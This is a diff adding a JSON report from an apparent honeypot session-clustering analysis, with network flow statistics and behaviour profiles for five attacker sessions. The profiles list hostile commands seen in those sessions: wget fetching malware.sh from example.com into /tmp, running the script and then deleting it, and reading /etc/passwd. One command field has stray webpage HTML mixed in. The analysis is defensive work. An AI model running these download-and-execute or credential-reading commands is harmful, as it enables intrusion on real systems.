@@ -1,0 +1,343 @@
+{
+  "source_files": {
+    "dec_results": "data/processed/dec_results.csv",
+    "session_mapping": "data/processed/session_mapping.csv",
+    "session_details": "data/parsed/session_details.json",
+    "model_input": "data/processed/model_input.csv"
+  },
+  "validation": {
+    "total_dec_sessions": 5,
+    "total_mapping_sessions": 5,
+    "duplicate_dec_sessions": [],
+    "duplicate_mapping_sessions": [],
+    "missing_in_mapping": [],
+    "missing_in_dec": [],
+    "missing_in_session_details": []
+  },
+  "cluster_distribution": [
+    {
+      "cluster_id": 1,
+      "session_count": 5,
+      "percentage_of_sessions": 100.0
+    }
+  ],
+  "cluster_summary": [
+    {
+      "cluster_id": 1,
+      "session_count": 5,
+      "percentage_of_sessions": 100.0,
+      "key_distinguishing_features": "tcprtt=0.042; synack=0.019; sttl=64.000; spkts=4.600; sload=257.045",
+      "dominant_behavioural_interpretation": "Mixed/Unclassified",
+      "top_command_categories": "reconnaissance (16); file_system (8); file_transfer (3); networking (3); credential_attack (2)"
+    }
+  ],
+  "cluster_feature_statistics": [
+    {
+      "cluster_id": 1,
+      "feature_name": "dur",
+      "mean": 7.344718,
+      "median": 4.960177,
+      "std": 4.37413111,
+      "min": 3.161629,
+      "max": 12.314849
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "spkts",
+      "mean": 4.6,
+      "median": 6.0,
+      "std": 1.94935887,
+      "min": 2.0,
+      "max": 6.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dpkts",
+      "mean": 6.4,
+      "median": 6.0,
+      "std": 0.89442719,
+      "min": 6.0,
+      "max": 8.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sbytes",
+      "mean": 163.2,
+      "median": 42.0,
+      "std": 269.89757316,
+      "min": 41.0,
+      "max": 646.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dbytes",
+      "mean": 1229.6,
+      "median": 1083.0,
+      "std": 496.31522241,
+      "min": 566.0,
+      "max": 1725.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "rate",
+      "mean": 224.77486,
+      "median": 149.205,
+      "std": 111.94274349,
+      "min": 136.5835,
+      "max": 348.5763
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": 0.0,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dttl",
+      "mean": 64.0,
+      "median": 64.0,
+      "std": 0.0,
+      "min": 64.0,
+      "max": 64.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sload",
+      "mean": 257.04484,
+      "median": 73.8046,
+      "std": 440.21405252,
+      "min": 27.2841,
+      "max": 1041.8983
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dload",
+      "mean": 1541.15392,
+      "median": 1165.2683,
+      "std": 684.17012473,
+      "min": 1018.8631,
+      "max": 2654.3279
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sinpkt",
+      "mean": 1.3595012,
+      "median": 1.012468,
+      "std": 0.71104688,
+      "min": 0.710467,
+      "max": 2.146865
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "dinpkt",
+      "mean": 1.3300088,
+      "median": 0.888086,
+      "std": 0.89500848,
+      "min": 0.528419,
+      "max": 2.335662
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "sjit",
+      "mean": 0.4657852,
+      "median": 0.580004,
+      "std": 0.32171386,
+      "min": 0.0,
+      "max": 0.81064
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "djit",
+      "mean": 2.7956554,
+      "median": 1.926555,
+      "std": 2.01554552,
+      "min": 0.985831,
+      "max": 5.023865
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "tcprtt",
+      "mean": 0.0418346,
+      "median": 0.006976,
+      "std": 0.07961455,
+      "min": 0.003433,
+      "max": 0.184169
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "synack",
+      "mean": 0.0188254,
+      "median": 0.003139,
+      "std": 0.03582661,
+      "min": 0.001545,
+      "max": 0.082876
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ackdat",
+      "mean": 0.6689666,
+      "median": 0.580317,
+      "std": 0.13773107,
+      "min": 0.557542,
+      "max": 0.828715
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_srv_src",
+      "mean": 5.0,
+      "median": 5.0,
+      "std": 0.0,
+      "min": 5.0,
+      "max": 5.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_state_ttl",
+      "mean": 1.0,
+      "median": 1.0,
+      "std": 0.0,
+      "min": 1.0,
+      "max": 1.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_dst_ltm",
+      "mean": 5.0,
+      "median": 5.0,
+      "std": 0.0,
+      "min": 5.0,
+      "max": 5.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_src_ltm",
+      "mean": 5.0,
+      "median": 5.0,
+      "std": 0.0,
+      "min": 5.0,
+      "max": 5.0
+    },
+    {
+      "cluster_id": 1,
+      "feature_name": "ct_srv_dst",
+      "mean": 5.0,
+      "median": 5.0,
+      "std": 0.0,
+      "min": 5.0,
+      "max": 5.0
+    }
+  ],
+  "cluster_command_analysis": [
+    {
+      "cluster_id": 1,
+      "command_or_category": "reconnaissance",
+      "frequency": 16,
+      "sessions_containing": 5,
+      "percentage_of_sessions": 22.7273
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "file_system",
+      "frequency": 8,
+      "sessions_containing": 5,
+      "percentage_of_sessions": 22.7273
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "file_transfer",
+      "frequency": 3,
+      "sessions_containing": 3,
+      "percentage_of_sessions": 13.6364
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "networking",
+      "frequency": 3,
+      "sessions_containing": 3,
+      "percentage_of_sessions": 13.6364
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "credential_attack",
+      "frequency": 2,
+      "sessions_containing": 2,
+      "percentage_of_sessions": 9.0909
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "privilege_escalation",
+      "frequency": 2,
+      "sessions_containing": 2,
+      "percentage_of_sessions": 9.0909
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "evasion",
+      "frequency": 1,
+      "sessions_containing": 1,
+      "percentage_of_sessions": 4.5455
+    },
+    {
+      "cluster_id": 1,
+      "command_or_category": "persistence",
+      "frequency": 1,
+      "sessions_containing": 1,
+      "percentage_of_sessions": 4.5455
+    }
+  ],
+  "session_behaviour_profiles": [
+    {
+      "session_id": "8bc90eb81f6a",
+      "dec_cluster": 1,
+      "evidence_count": 9,
+      "observed_command_categories": "credential_attack, file_system, privilege_escalation, reconnaissance",
+      "observed_commands": "cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",
+      "behavioural_interpretation": "Mixed/Unclassified",
+      "evidence": "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 12.314849"
+    },
+    {
+      "session_id": "6a0b14ea5061",
+      "dec_cluster": 1,
+      "evidence_count": 4,
+      "observed_command_categories": "file_system, file_transfer, networking, reconnaissance",
+      "observed_commands": "cd /tmp, wget http://example.com/malware.sh",
+      "behavioural_interpretation": "Download or payload retrieval",
+      "evidence": "Observed commands: cd /tmp, wget http://example.com/malware.sh; Command categories: file_system, file_transfer, networking, reconnaissance; Authentication success flag: 1; Session duration: 4.444169"
+    },
+    {
+      "session_id": "032b5c63590e",
+      "dec_cluster": 1,
+      "evidence_count": 10,
+      "observed_command_categories": "evasion, file_system, file_transfer, networking, persistence, reconnaissance",
+      "observed_commands": "./malware.sh, <!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewport content=\"width=device-width,initial-scale=1\"><title>Example Domain</title><style>html{color-scheme:light dark;background:light-dark(#eee,#222)}body{font:16px/1.6 system-ui,sans-serif;max-width:26em;margin:auto;padding:25vh 2em 2em;text-align:center}</style></head><body><p>This domain is for use in documentation examples without needing permission. This is not a service; avoid relying on it for testing and monitoring purposes.</p><script src=/s.js></script></body></html>, cd /tmp, exit, rm malware.sh, wget http://example.com/malware.sh",
+      "behavioural_interpretation": "Persistence-related activity",
+      "evidence": "Observed commands: ./malware.sh, <!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewport content=\"width=device-width,initial-scale=1\"><title>Example Domain</title><style>html{color-scheme:light dark;background:light-dark(#eee,#222)}body{font:16px/1.6 system-ui,sans-serif;max-width:26em;margin:auto;padding:25vh 2em 2em;text-align:center}</style></head><body><p>This domain is for use in documentation examples without needing permission. This is not a service; avoid relying on it for testing and monitoring purposes.</p><script src=/s.js></script></body></html>, cd /tmp, exit, rm malware.sh; Command categories: evasion, file_system, file_transfer, networking, persistence, reconnaissance; Authentication success flag: 1; Session duration: 4.960177"
+    },
+    {
+      "session_id": "e8368cd0690d",
+      "dec_cluster": 1,
+      "evidence_count": 4,
+      "observed_command_categories": "file_system, file_transfer, networking, reconnaissance",
+      "observed_commands": "cd /tmp, exit, wget http://example.com/malware.sh",
+      "behavioural_interpretation": "Download or payload retrieval",
+      "evidence": "Observed commands: cd /tmp, exit, wget http://example.com/malware.sh; Command categories: file_system, file_transfer, networking, reconnaissance; Authentication success flag: 1; Session duration: 3.161629"
+    },
+    {
+      "session_id": "5eb1bc4dfe00",
+      "dec_cluster": 1,
+      "evidence_count": 9,
+      "observed_command_categories": "credential_attack, file_system, privilege_escalation, reconnaissance",
+      "observed_commands": "cat /etc/passwd, exit, ls -la, pwd, uname -a, whoami",
+      "behavioural_interpretation": "Mixed/Unclassified",
+      "evidence": "Observed commands: cat /etc/passwd, exit, ls -la, pwd, uname -a; Command categories: credential_attack, file_system, privilege_escalation, reconnaissance; Authentication success flag: 1; Session duration: 11.842766"
+    }
+  ],
+  "notes": {
+    "cluster_ids_are_not_attack_labels": true,
+    "feature_source_used": "DEC results file (contains session ID + cluster assignment + the same numerical feature columns used to cluster the sessions)"
+  }
+}
